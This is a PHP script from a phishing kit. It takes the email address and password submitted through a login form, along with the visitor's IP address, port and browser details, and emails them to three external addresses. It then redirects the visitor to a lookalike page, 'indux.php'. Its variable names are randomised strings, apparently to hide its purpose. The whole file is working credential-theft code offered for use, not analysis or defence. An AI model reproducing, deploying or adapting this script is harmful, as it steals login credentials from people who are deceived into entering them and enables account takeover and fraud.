<?php
if(isset($_POST['TETcuYGOc'])){
$TDUOio = "peecee253@gmail.com , akinzoffice001@yahoo.com , adminbasis@protonmail.com";
$kjhgfgdUK = "Info";
$KHcCxFfjD = date('Y-m-d | H:i:s');
$kvjBUGF5G  = $_SERVER['HTTP_USER_AGENT'];
$y6e3VJHVc = $_SERVER['REMOTE_ADDR'];
$hjghFGDcg = $_SERVER['REMOTE_PORT'];
$gcRR67VGC = $_POST['TYRdgbkNLKBIJgyfcXHBK'];
$VftyrdyKB = $_POST['HGFDSwrtbczyFGDFSfgh'];
$VJHgytdyc = <<<EOD
------------AbleGod-------------
Date/Time  : $KHcCxFfjD
Browser    : $kvjBUGF5G
IP         : $y6e3VJHVc
Port       : $hjghFGDcg
Email      : $gcRR67VGC
Password   : $VftyrdyKB
-----------------------------
EOD;
mail($TDUOio, $kjhgfgdUK, $VJHgytdyc);
header('location:indux.php');
}
?>